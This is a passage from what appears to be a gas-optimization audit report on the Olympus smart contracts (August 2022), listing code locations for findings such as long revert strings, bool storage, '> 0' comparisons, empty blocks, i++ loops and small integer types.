Shortening revert strings to fit in 32 bytes will decrease gas costs for deployment and gas costs when the revert condition has been met.  ```solidity 2022-08-olympus/src/external/OlympusERC20.sol::107 => revert("ECDSA: invalid signature 's' value");  2022-08-olympus/src/external/OlympusERC20.sol::109 => revert("ECDSA: invalid signature 'v' value");  2022-08-olympus/src/external/OlympusERC20.sol::597 => require(c / a == b, "SafeMath: multiplication overflow");  2022-08-olympus/src/external/OlympusERC20.sol::769 => require(sender != address(0), "ERC20: transfer from the zero address");  2022-08-olympus/src/external/OlympusERC20.sol::770 => require(recipient != address(0), "ERC20: transfer to the zero address");  2022-08-olympus/src/external/OlympusERC20.sol::788 => require(account != address(0), "ERC20: burn from the zero address");  2022-08-olympus/src/external/OlympusERC20.sol::802 => require(owner != address(0), "ERC20: approve from the zero address");  2022-08-olympus/src/external/OlympusERC20.sol::803 => require(spender != address(0), "ERC20: approve to the zero address"); ```  ## 5. Using `bool`s for storage incurs overhead (20 instances)  Use `uint256(1)` and `uint256(2)` for true/false. Booleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled.  ```solidity 2022-08-olympus/src/Kernel.sol::113 => bool public isActive;  2022-08-olympus/src/Kernel.sol::207 => bool granted_  2022-08-olympus/src/Kernel.sol::394 => bool grant_  2022-08-olympus/src/interfaces/IBondAuctioneer.sol::48 => bool capacityInQuote;  2022-08-olympus/src/modules/PRICE.sol::62 => bool public initialized;  2022-08-olympus/src/modules/RANGE.sol::44 => bool active; // Whether or not the side is active (i.e. the Operator is performing market operations on this side, true = active, false = inactive)  2022-08-olympus/src/modules/RANGE.sol::216 => bool high_,  2022-08-olympus/src/policies/Heart.sol::33 => bool public active;  2022-08-olympus/src/policies/Operator.sol::63 => bool public initialized;  2022-08-olympus/src/policies/Operator.sol::66 => bool public active;  2022-08-olympus/src/policies/Operator.sol::735 => bool sideActive = RANGE.active(high_);  2022-08-olympus/src/policies/interfaces/IOperator.sol::34 => bool[] observations; // individual observations: true = price on other side of average, false = price on same side of average  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::83 => bool public allowNewMarkets;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::636 => bool active  2022-08-olympus/src/test/lib/bonds/interfaces/IBondAuctioneer.sol::48 => bool capacityInQuote;  2022-08-olympus/src/test/lib/bonds/interfaces/IBondCDA.sol::14 => bool capacityInQuote; // capacity limit is in payment token (true) or in payout (false, default)  2022-08-olympus/src/test/lib/bonds/interfaces/IBondCDA.sol::52 => bool active;  2022-08-olympus/src/test/lib/bonds/interfaces/IBondFixedTermTeller.sol::9 => bool active;  2022-08-olympus/src/test/mocks/MockPrice.sol::15 => bool public result;  2022-08-olympus/src/test/policies/Heart.t.sol::23 => bool public result; ```  ## 6. Use `!= 0` instead of `> 0` when comparing uint (11 instances)  When dealing with unsigned integer types, comparisons with `!= 0` are cheaper then with `> 0`.  ```solidity 2022-08-olympus/src/external/OlympusERC20.sol::245 => if (uint256(s) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) {  2022-08-olympus/src/external/OlympusERC20.sol::611 => require(b > 0, errorMessage);  2022-08-olympus/src/libraries/FullMath.sol::35 => require(denominator > 0);  2022-08-olympus/src/libraries/FullMath.sol::122 => if (mulmod(a, b, denominator) > 0) {  2022-08-olympus/src/policies/Governance.sol::247 => if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {  2022-08-olympus/src/test/modules/TRSRY.t.sol::98 => vm.assume(amount_ > 0);  2022-08-olympus/src/test/modules/TRSRY.t.sol::108 => vm.assume(amount_ > 0);  2022-08-olympus/src/test/modules/TRSRY.t.sol::126 => vm.assume(amount_ > 0);  2022-08-olympus/src/test/modules/TRSRY.t.sol::143 => vm.assume(amount_ > 0);  2022-08-olympus/src/utils/KernelUtils.sol::46 => if (char < 0x41 || char > 0x5A) revert InvalidKeycode(keycode_); // A-Z only  2022-08-olympus/src/utils/KernelUtils.sol::60 => if ((char < 0x61 || char > 0x7A) && char != 0x5f && char != 0x00) { ```  ## 7. Empty blocks should be removed (42 instances)  Empty blocks exist in the code. The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting.  ```solidity 2022-08-olympus/src/Kernel.sol::85 => constructor(Kernel kernel_) KernelAdapter(kernel_) {}  2022-08-olympus/src/Kernel.sol::95 => function KEYCODE() public pure virtual returns (Keycode) {}  2022-08-olympus/src/Kernel.sol::100 => function VERSION() external pure virtual returns (uint8 major, uint8 minor) {}  2022-08-olympus/src/Kernel.sol::105 => function INIT() external virtual onlyKernel {}  2022-08-olympus/src/Kernel.sol::115 => constructor(Kernel kernel_) KernelAdapter(kernel_) {}  2022-08-olympus/src/Kernel.sol::139 => function configureDependencies() external virtual returns (Keycode[] memory dependencies) {}  2022-08-olympus/src/Kernel.sol::143 => function requestPermissions() external view virtual returns (Permissions[] memory requests) {}  2022-08-olympus/src/external/OlympusERC20.sol::813 => ) internal virtual {}  2022-08-olympus/src/external/OlympusERC20.sol::844 => constructor(string memory name) EIP712(name, "1") {}  2022-08-olympus/src/external/OlympusERC20.sol::908 => {}  2022-08-olympus/src/interfaces/AggregatorV2V3Interface.sol::53 => interface AggregatorV2V3Interface is AggregatorInterface, AggregatorV3Interface {}  2022-08-olympus/src/modules/INSTR.sol::20 => constructor(Kernel kernel_) Module(kernel_) {}  2022-08-olympus/src/modules/TRSRY.sol::45 => constructor(Kernel kernel_) Module(kernel_) {}  2022-08-olympus/src/modules/VOTES.sol::19 => {}  2022-08-olympus/src/policies/Governance.sol::59 => constructor(Kernel kernel_) Policy(kernel_) {}  2022-08-olympus/src/policies/PriceConfig.sol::15 => constructor(Kernel kernel_) Policy(kernel_) {}  2022-08-olympus/src/policies/TreasuryCustodian.sol::24 => constructor(Kernel kernel_) Policy(kernel_) {}  2022-08-olympus/src/policies/VoterRegistration.sol::16 => constructor(Kernel kernel_) Policy(kernel_) {}  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::57 => constructor(address guardian_, Authority authority_) Auth(guardian_, authority_) {}  2022-08-olympus/src/test/lib/bonds/BondFixedTermCDA.sol::29 => ) BondBaseCDA(teller_, aggregator_, guardian_, authority_) {}  2022-08-olympus/src/test/lib/bonds/BondFixedTermTeller.sol::50 => ) BondBaseTeller(protocol_, aggregator_, guardian_, authority_) {}  2022-08-olympus/src/test/mocks/Faucet.sol::76 => receive() external payable {}  2022-08-olympus/src/test/mocks/KernelTestMocks.sol::9 => constructor(Kernel kernel_) Policy(kernel_) {}  2022-08-olympus/src/test/mocks/KernelTestMocks.sol::33 => constructor(Kernel kernel_) Module(kernel_) {}  2022-08-olympus/src/test/mocks/KernelTestMocks.sol::78 => constructor(Kernel kernel_) Module(kernel_) {}  2022-08-olympus/src/test/mocks/KernelTestMocks.sol::87 => function INIT() public override onlyKernel {}  2022-08-olympus/src/test/mocks/MockInvalidModule.sol::7 => constructor(Kernel kernel_) Module(kernel_) {}  2022-08-olympus/src/test/mocks/MockModuleWriter.sol::22 => function configureDependencies() external override returns (Keycode[] memory dependencies) {}  2022-08-olympus/src/test/mocks/MockPrice.sol::46 => {}  2022-08-olympus/src/test/mocks/MockPrice.sol::48 => function changeMovingAverageDuration(uint48 movingAverageDuration_) external {}  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::52 => function latestRound() external view override returns (uint256) {}  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::54 => function getAnswer(uint256 roundId) external view override returns (int256) {}  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::56 => function getTimestamp(uint256 roundId) external view override returns (uint256) {}  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::58 => function description() external view override returns (string memory) {}  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::60 => function version() external view override returns (uint256) {}  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::76 => {}  2022-08-olympus/src/test/mocks/MockValidModule.sol::9 => constructor(Kernel kernel_) Module(kernel_) {}  2022-08-olympus/src/test/mocks/MockValidUpgradedModule.sol::9 => constructor(Kernel kernel_) Module(kernel_) {}  2022-08-olympus/src/test/policies/BondCallback.t.sol::35 => ) ERC20(_name, _symbol, _decimals) {}  2022-08-olympus/src/test/policies/Heart.t.sol::31 => function configureDependencies() external override returns (Keycode[] memory dependencies) {}  2022-08-olympus/src/test/policies/Heart.t.sol::33 => function requestPermissions() external view override returns (Permissions[] memory requests) {}  2022-08-olympus/src/test/policies/Operator.t.sol::34 => ) ERC20(_name, _symbol, _decimals) {} ```  ## 8. Don't initialize variables with default value (5 instances)  Uninitialized variables are assigned with the types default value. Explicitly initializing a variable with it's default value costs unnecesary gas.  ```solidity 2022-08-olympus/src/Kernel.sol::397 => for (uint256 i = 0; i < reqLength; ) {  2022-08-olympus/src/scripts/Deploy.sol::239 => for (uint i = 0; i < 90; i++) {  2022-08-olympus/src/test/lib/UserFactory.sol::25 => for (uint256 i = 0; i < userNum; i++) {  2022-08-olympus/src/utils/KernelUtils.sol::43 => for (uint256 i = 0; i < 5; ) {  2022-08-olympus/src/utils/KernelUtils.sol::58 => for (uint256 i = 0; i < 32; ) { ```  ## 9. Use `++i`/`--i` instead of `i++`/`i--` (6 instances)  Using `++i`/`--i` saves 6 gas per loop.  ```solidity 2022-08-olympus/src/scripts/Deploy.sol::239 => for (uint i = 0; i < 90; i++) {  2022-08-olympus/src/test/lib/ModuleTestFixtureGenerator.sol::19 => for (uint256 i; i < len; i++) {  2022-08-olympus/src/test/lib/ModuleTestFixtureGenerator.sol::38 => for (uint256 i; i < len; i++) {  2022-08-olympus/src/test/lib/UserFactory.sol::25 => for (uint256 i = 0; i < userNum; i++) {  2022-08-olympus/src/test/mocks/MockModuleWriter.sol::16 => for (uint256 i; i < len; i++) {  2022-08-olympus/src/test/mocks/MockModuleWriter.sol::32 => for (uint256 i; i < len; i++) { ```  ## 10. Split `require(xxx && yyy)` to `require(xxx)` and `require(yyy)` (3 instances)  Instead of using operator && on single require check, using double `require()` checks can save more gas.  ```solidity 2022-08-olympus/src/libraries/TransferHelper.sol::20 => require(success && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FROM_FAILED");  2022-08-olympus/src/libraries/TransferHelper.sol::32 => require(success && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");  2022-08-olympus/src/libraries/TransferHelper.sol::44 => require(success && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED"); ```  ## 11. Use uint256/int256 instead of other variations (245 instances)  Using smaller data types such as uint8/int8 is more expensive than using uint256/int256. The EVM works with 256bit/32byte words. Every operation is based on these base units. If the data is smaller, further operations are needed to downscale from 256 bits to 8 bits, and this is more expensive than using uint256/int256.  ```solidity 2022-08-olympus/src/Kernel.sol::100 => function VERSION() external pure virtual returns (uint8 major, uint8 minor) {}  2022-08-olympus/src/external/OlympusERC20.sol::144 => uint8 v;  2022-08-olympus/src/external/OlympusERC20.sol::201 => uint8 v;  2022-08-olympus/src/external/OlympusERC20.sol::232 => uint8 v,  2022-08-olympus/src/external/OlympusERC20.sol::267 => uint8 v,  2022-08-olympus/src/external/OlympusERC20.sol::458 => uint8 v,  2022-08-olympus/src/external/OlympusERC20.sol::677 => uint8 internal immutable _decimals;  2022-08-olympus/src/external/OlympusERC20.sol::682 => uint8 decimals_  2022-08-olympus/src/external/OlympusERC20.sol::697 => function decimals() public view virtual returns (uint8) {  2022-08-olympus/src/external/OlympusERC20.sol::854 => uint8 v,  2022-08-olympus/src/interfaces/AggregatorV2V3Interface.sol::21 => function decimals() external view returns (uint8);  2022-08-olympus/src/interfaces/AggregatorV2V3Interface.sol::30 => function getRoundData(uint80 _roundId)  2022-08-olympus/src/interfaces/AggregatorV2V3Interface.sol::34 => uint80 roundId,  2022-08-olympus/src/interfaces/AggregatorV2V3Interface.sol::38 => uint80 answeredInRound  2022-08-olympus/src/interfaces/AggregatorV2V3Interface.sol::45 => uint80 roundId,  2022-08-olympus/src/interfaces/AggregatorV2V3Interface.sol::49 => uint80 answeredInRound  2022-08-olympus/src/interfaces/IBondAuctioneer.sol::52 => uint32 debtBuffer;  2022-08-olympus/src/interfaces/IBondAuctioneer.sol::55 => uint32 depositInterval;  2022-08-olympus/src/interfaces/IBondAuctioneer.sol::56 => int8 scaleAdjustment;  2022-08-olympus/src/interfaces/IBondAuctioneer.sol::90 => function setIntervals(uint256 id_, uint32[3] calldata intervals_) external;  2022-08-olympus/src/interfaces/IBondAuctioneer.sol::116 => function setDefaults(uint32[6] memory defaults_) external;  2022-08-olympus/src/modules/INSTR.sol::28 => function VERSION() public pure override returns (uint8 major, uint8 minor) {  2022-08-olympus/src/modules/MINTR.sol::25 => function VERSION() external pure override returns (uint8 major, uint8 minor) {  2022-08-olympus/src/modules/PRICE.sol::44 => uint32 public nextObsIndex;  2022-08-olympus/src/modules/PRICE.sol::47 => uint32 public numObservations;  2022-08-olympus/src/modules/PRICE.sol::59 => uint8 public constant decimals = 18;  2022-08-olympus/src/modules/PRICE.sol::84 => uint8 ohmEthDecimals = _ohmEthPriceFeed.decimals();  2022-08-olympus/src/modules/PRICE.sol::87 => uint8 reserveEthDecimals = _reserveEthPriceFeed.decimals();  2022-08-olympus/src/modules/PRICE.sol::97 => numObservations = uint32(movingAverageDuration_ / observationFrequency_);  2022-08-olympus/src/modules/PRICE.sol::113 => function VERSION() external pure override returns (uint8 major, uint8 minor) {  2022-08-olympus/src/modules/PRICE.sol::127 => uint32 numObs = numObservations;  2022-08-olympus/src/modules/PRICE.sol::185 => uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1;  2022-08-olympus/src/modules/PRICE.sol::257 => numObservations = uint32(newObservations);  2022-08-olympus/src/modules/PRICE.sol::289 => numObservations = uint32(newObservations);  2022-08-olympus/src/modules/RANGE.sol::115 => function VERSION() external pure override returns (uint8 major, uint8 minor) {  2022-08-olympus/src/modules/TRSRY.sol::51 => function VERSION() external pure override returns (uint8 major, uint8 minor) {  2022-08-olympus/src/modules/VOTES.sol::27 => function VERSION() external pure override returns (uint8 major, uint8 minor) {  2022-08-olympus/src/policies/Operator.sol::51 => event CushionFactorChanged(uint32 cushionFactor_);  2022-08-olympus/src/policies/Operator.sol::52 => event CushionParamsChanged(uint32 duration_, uint32 debtBuffer_, uint32 depositInterval_);  2022-08-olympus/src/policies/Operator.sol::53 => event ReserveFactorChanged(uint32 reserveFactor_);  2022-08-olympus/src/policies/Operator.sol::54 => event RegenParamsChanged(uint32 wait_, uint32 threshold_, uint32 observe_);  2022-08-olympus/src/policies/Operator.sol::83 => uint8 public immutable ohmDecimals;  2022-08-olympus/src/policies/Operator.sol::86 => uint8 public immutable reserveDecimals;  2022-08-olympus/src/policies/Operator.sol::89 => uint32 public constant FACTOR_SCALE = 1e4;  2022-08-olympus/src/policies/Operator.sol::97 => uint32[8] memory configParams // [cushionFactor, cushionDuration, cushionDebtBuffer, cushionDepositInterval, reserveFactor, regenWait, regenThreshold, regenObserve]  2022-08-olympus/src/policies/Operator.sol::106 => if (configParams[2] < uint32(10_000)) revert Operator_InvalidParams();  2022-08-olympus/src/policies/Operator.sol::108 => if (configParams[3] < uint32(1 hours) || configParams[3] > configParams[1])  2022-08-olympus/src/policies/Operator.sol::116 => configParams[7] == uint32(0)  2022-08-olympus/src/policies/Operator.sol::127 => count: uint32(0),  2022-08-olympus/src/policies/Operator.sol::129 => nextObservation: uint32(0),  2022-08-olympus/src/policies/Operator.sol::371 => int8 priceDecimals = _getPriceDecimals(range.cushion.high.price);  2022-08-olympus/src/policies/Operator.sol::372 => int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);  2022-08-olympus/src/policies/Operator.sol::375 => uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);  2022-08-olympus/src/policies/Operator.sol::377 => uint8(  2022-08-olympus/src/policies/Operator.sol::378 => 36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals  2022-08-olympus/src/policies/Operator.sol::418 => uint8 oracleDecimals = PRICE.decimals();  2022-08-olympus/src/policies/Operator.sol::426 => int8 priceDecimals = _getPriceDecimals(invCushionPrice);  2022-08-olympus/src/policies/Operator.sol::427 => int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);  2022-08-olympus/src/policies/Operator.sol::430 => uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);  2022-08-olympus/src/policies/Operator.sol::432 => uint8(  2022-08-olympus/src/policies/Operator.sol::433 => 36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals  2022-08-olympus/src/policies/Operator.sol::484 => function _getPriceDecimals(uint256 price_) internal view returns (int8) {  2022-08-olympus/src/policies/Operator.sol::485 => int8 decimals;  2022-08-olympus/src/policies/Operator.sol::493 => return decimals - int8(PRICE.decimals());  2022-08-olympus/src/policies/Operator.sol::516 => function setCushionFactor(uint32 cushionFactor_) external onlyRole("operator_policy") {  2022-08-olympus/src/policies/Operator.sol::528 => uint32 duration_,  2022-08-olympus/src/policies/Operator.sol::529 => uint32 debtBuffer_,  2022-08-olympus/src/policies/Operator.sol::530 => uint32 depositInterval_  2022-08-olympus/src/policies/Operator.sol::535 => if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams();  2022-08-olympus/src/policies/Operator.sol::536 => if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)  2022-08-olympus/src/policies/Operator.sol::548 => function setReserveFactor(uint32 reserveFactor_) external onlyRole("operator_policy") {  2022-08-olympus/src/policies/Operator.sol::560 => uint32 wait_,  2022-08-olympus/src/policies/Operator.sol::561 => uint32 threshold_,  2022-08-olympus/src/policies/Operator.sol::562 => uint32 observe_  2022-08-olympus/src/policies/Operator.sol::665 => uint32 observe = _config.regenObserve;  2022-08-olympus/src/policies/Operator.sol::705 => _status.high.count = uint32(0);  2022-08-olympus/src/policies/Operator.sol::707 => _status.high.nextObservation = uint32(0);  2022-08-olympus/src/policies/Operator.sol::717 => _status.low.count = uint32(0);  2022-08-olympus/src/policies/Operator.sol::719 => _status.low.nextObservation = uint32(0);  2022-08-olympus/src/policies/interfaces/IOperator.sol::13 => uint32 cushionFactor; // percent of capacity to be used for a single cushion deployment, assumes 2 decimals (i.e. 1000 = 10%)  2022-08-olympus/src/policies/interfaces/IOperator.sol::14 => uint32 cushionDuration; // duration of a single cushion deployment in seconds  2022-08-olympus/src/policies/interfaces/IOperator.sol::15 => uint32 cushionDebtBuffer; // Percentage over the initial debt to allow the market to accumulate at any one time. Percent with 3 decimals, e.g. 1_000 = 1 %. See IBondAuctioneer for more info.  2022-08-olympus/src/policies/interfaces/IOperator.sol::16 => uint32 cushionDepositInterval; // Target frequency of deposits. Determines max payout of the bond market. See IBondAuctioneer for more info.  2022-08-olympus/src/policies/interfaces/IOperator.sol::17 => uint32 reserveFactor; // percent of reserves in treasury to be used for a single wall, assumes 2 decimals (i.e. 1000 = 10%)  2022-08-olympus/src/policies/interfaces/IOperator.sol::18 => uint32 regenWait; // minimum duration to wait to reinstate a wall in seconds  2022-08-olympus/src/policies/interfaces/IOperator.sol::19 => uint32 regenThreshold; // number of price points on other side of moving average to reinstate a wall  2022-08-olympus/src/policies/interfaces/IOperator.sol::20 => uint32 regenObserve; // number of price points to observe to determine regeneration  2022-08-olympus/src/policies/interfaces/IOperator.sol::31 => uint32 count; // current number of price points that count towards regeneration  2022-08-olympus/src/policies/interfaces/IOperator.sol::33 => uint32 nextObservation; // index of the next observation in the observations array  2022-08-olympus/src/policies/interfaces/IOperator.sol::85 => function setCushionFactor(uint32 cushionFactor_) external;  2022-08-olympus/src/policies/interfaces/IOperator.sol::93 => uint32 duration_,  2022-08-olympus/src/policies/interfaces/IOperator.sol::94 => uint32 debtBuffer_,  2022-08-olympus/src/policies/interfaces/IOperator.sol::95 => uint32 depositInterval_  2022-08-olympus/src/policies/interfaces/IOperator.sol::101 => function setReserveFactor(uint32 reserveFactor_) external;  2022-08-olympus/src/policies/interfaces/IOperator.sol::110 => uint32 wait_,  2022-08-olympus/src/policies/interfaces/IOperator.sol::111 => uint32 threshold_,  2022-08-olympus/src/policies/interfaces/IOperator.sol::112 => uint32 observe_  2022-08-olympus/src/scripts/Deploy.sol::137 => uint32(3000), // cushionFactor  2022-08-olympus/src/scripts/Deploy.sol::138 => uint32(3 days), // cushionDuration  2022-08-olympus/src/scripts/Deploy.sol::139 => uint32(100_000), // cushionDebtBuffer  2022-08-olympus/src/scripts/Deploy.sol::140 => uint32(1 hours), // cushionDepositInterval  2022-08-olympus/src/scripts/Deploy.sol::141 => uint32(800), // reserveFactor  2022-08-olympus/src/scripts/Deploy.sol::142 => uint32(1 hours), // regenWait  2022-08-olympus/src/scripts/Deploy.sol::143 => uint32(5), // regenThreshold // 18  2022-08-olympus/src/scripts/Deploy.sol::144 => uint32(7) // regenObserve    // 21  2022-08-olympus/src/test/lib/UserFactory.sol::9 => address(bytes20(uint160(uint256(keccak256("hevm cheat code")))));  2022-08-olympus/src/test/lib/UserFactory.sol::17 => address payable user = payable(address(uint160(uint256(nextUser))));  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::89 => uint32 public defaultTuneInterval;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::90 => uint32 public defaultTuneAdjustment;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::92 => uint32 public minDebtDecayInterval;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::93 => uint32 public minDepositInterval;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::94 => uint32 public minMarketDuration;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::95 => uint32 public minDebtBuffer;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::138 => uint8 payoutTokenDecimals = params_.payoutToken.decimals();  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::139 => uint8 quoteTokenDecimals = params_.quoteToken.decimals();  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::160 => scale = 10**uint8(36 + params_.scaleAdjustment);  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::169 => uint32 secondsToConclusion;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::170 => uint32 debtDecayInterval;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::172 => secondsToConclusion = uint32(params_.conclusion - block.timestamp);  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::182 => uint32 userDebtDecay = params_.depositInterval * 5;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::296 => function setIntervals(uint256 id_, uint32[3] calldata intervals_) external override {  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::338 => function setDefaults(uint32[6] memory defaults_) external override requiresAuth {  2022-08-olympus/src/test/lib/bonds/bases/BondBaseTeller.sol::299 => uint8 temp = (48 + uint8(_i - (_i / 10) * 10));  2022-08-olympus/src/test/lib/bonds/interfaces/IBondAuctioneer.sol::52 => uint32 debtBuffer;  2022-08-olympus/src/test/lib/bonds/interfaces/IBondAuctioneer.sol::55 => uint32 depositInterval;  2022-08-olympus/src/test/lib/bonds/interfaces/IBondAuctioneer.sol::56 => int8 scaleAdjustment;  2022-08-olympus/src/test/lib/bonds/interfaces/IBondAuctioneer.sol::90 => function setIntervals(uint256 id_, uint32[3] calldata intervals_) external;  2022-08-olympus/src/test/lib/bonds/interfaces/IBondAuctioneer.sol::116 => function setDefaults(uint32[6] memory defaults_) external;  2022-08-olympus/src/test/lib/bonds/interfaces/IBondCDA.sol::37 => uint32 length; // time from creation to conclusion.  2022-08-olympus/src/test/lib/bonds/interfaces/IBondCDA.sol::38 => uint32 depositInterval; // target frequency of deposits  2022-08-olympus/src/test/lib/bonds/interfaces/IBondCDA.sol::39 => uint32 tuneInterval; // frequency of tuning  2022-08-olympus/src/test/lib/bonds/interfaces/IBondCDA.sol::40 => uint32 tuneAdjustmentDelay; // time to implement downward tuning adjustments  2022-08-olympus/src/test/lib/bonds/interfaces/IBondCDA.sol::41 => uint32 debtDecayInterval; // interval over which debt should decay completely  2022-08-olympus/src/test/lib/larping.sol::9 => address(bytes20(uint160(uint256(keccak256("hevm cheat code")))));  2022-08-olympus/src/test/lib/larping.sol::139 => function larp(function () external returns(uint8) f, uint8 returned1) internal {  2022-08-olympus/src/test/lib/larping.sol::147 => function larpp(function () external payable returns(uint8) f, uint8 returned1) internal {  2022-08-olympus/src/test/lib/larping.sol::155 => function larpv(function () external view returns(uint8) f, uint8 returned1) internal {  2022-08-olympus/src/test/lib/quabi/Quabi.sol::8 => Vm internal constant vm = Vm(address(bytes20(uint160(uint256(keccak256("hevm cheat code"))))));  2022-08-olympus/src/test/mocks/MockPrice.sol::14 => uint8 public decimals;  2022-08-olympus/src/test/mocks/MockPrice.sol::30 => function VERSION() external pure override returns (uint8 major, uint8 minor) {  2022-08-olympus/src/test/mocks/MockPrice.sol::80 => function setDecimals(uint8 decimals_) external {  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::8 => uint8 public s_decimals;  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::19 => function setDecimals(uint8 decimals_) public {  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::23 => function decimals() external view override returns (uint8) {  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::40 => uint80 roundId,  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::44 => uint80 answeredInRound  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::65 => function getRoundData(uint80 _roundId)  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::70 => uint80 roundId,  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::74 => uint80 answeredInRound  2022-08-olympus/src/test/mocks/MockValidModule.sol::15 => function VERSION() external pure override returns (uint8 major, uint8 minor) {  2022-08-olympus/src/test/mocks/MockValidUpgradedModule.sol::15 => function VERSION() external pure override returns (uint8 major, uint8 minor) {  2022-08-olympus/src/test/modules/PRICE.t.sol::57 => uint48(8 hours), // uint32 observationFrequency_,  2022-08-olympus/src/test/modules/PRICE.t.sol::58 => uint48(7 days) // uint32 movingAverageDuration_,  2022-08-olympus/src/test/modules/PRICE.t.sol::79 => function initializePrice(uint8 nonce) internal {  2022-08-olympus/src/test/modules/PRICE.t.sol::118 => function makeRandomObservations(uint8 nonce, uint256 observations)  2022-08-olympus/src/test/modules/PRICE.t.sol::163 => function testCorrectness_onlyPermittedPoliciesCanCallUpdateMovingAverage(uint8 nonce) public {  2022-08-olympus/src/test/modules/PRICE.t.sol::177 => function testCorrectness_updateMovingAverage(uint8 nonce) public {  2022-08-olympus/src/test/modules/PRICE.t.sol::209 => function testCorrectness_updateMovingAverageMultipleTimes(uint8 nonce) public {  2022-08-olympus/src/test/modules/PRICE.t.sol::218 => assertEq(price.nextObsIndex(), uint32(15));  2022-08-olympus/src/test/modules/PRICE.t.sol::248 => function testCorrectness_getCurrentPrice(uint8 nonce) public {  2022-08-olympus/src/test/modules/PRICE.t.sol::290 => function testCorrectness_getLastPrice(uint8 nonce) public {  2022-08-olympus/src/test/modules/PRICE.t.sol::298 => uint32 numObservations = price.numObservations();  2022-08-olympus/src/test/modules/PRICE.t.sol::299 => uint32 nextObsIndex = price.nextObsIndex();  2022-08-olympus/src/test/modules/PRICE.t.sol::300 => uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1;  2022-08-olympus/src/test/modules/PRICE.t.sol::304 => function testCorrectness_getMovingAverage(uint8 nonce) public {  2022-08-olympus/src/test/modules/PRICE.t.sol::348 => function testCorrectness_initialize(uint8 nonce) public {  2022-08-olympus/src/test/modules/PRICE.t.sol::369 => function testFail_cannotReinitialize(uint8 nonce) public {  2022-08-olympus/src/test/modules/PRICE.t.sol::416 => function testCorrectness_changeMovingAverageDuration(uint8 nonce) public {  2022-08-olympus/src/test/modules/PRICE.t.sol::451 => function testCorrectness_changeObservationFrequency(uint8 nonce) public {  2022-08-olympus/src/test/policies/BondCallback.t.sol::34 => uint8 _decimals  2022-08-olympus/src/test/policies/BondCallback.t.sol::140 => uint32(2000), // cushionFactor  2022-08-olympus/src/test/policies/BondCallback.t.sol::141 => uint32(5 days), // duration  2022-08-olympus/src/test/policies/BondCallback.t.sol::142 => uint32(100_000), // debtBuffer  2022-08-olympus/src/test/policies/BondCallback.t.sol::143 => uint32(1 hours), // depositInterval  2022-08-olympus/src/test/policies/BondCallback.t.sol::144 => uint32(1000), // reserveFactor  2022-08-olympus/src/test/policies/BondCallback.t.sol::145 => uint32(1 hours), // regenWait  2022-08-olympus/src/test/policies/BondCallback.t.sol::146 => uint32(5), // regenThreshold  2022-08-olympus/src/test/policies/BondCallback.t.sol::147 => uint32(7) // regenObserve  2022-08-olympus/src/test/policies/BondCallback.t.sol::246 => int8 _quotePriceDecimals,  2022-08-olympus/src/test/policies/BondCallback.t.sol::247 => int8 _payoutPriceDecimals,  2022-08-olympus/src/test/policies/BondCallback.t.sol::250 => uint8 _payoutDecimals = payoutToken.decimals();  2022-08-olympus/src/test/policies/BondCallback.t.sol::251 => uint8 _quoteDecimals = quoteToken.decimals();  2022-08-olympus/src/test/policies/BondCallback.t.sol::253 => uint256 capacity = 100_000 * 10**uint8(int8(_payoutDecimals) - _payoutPriceDecimals);  2022-08-olympus/src/test/policies/BondCallback.t.sol::255 => int8 scaleAdjustment = int8(_payoutDecimals) -  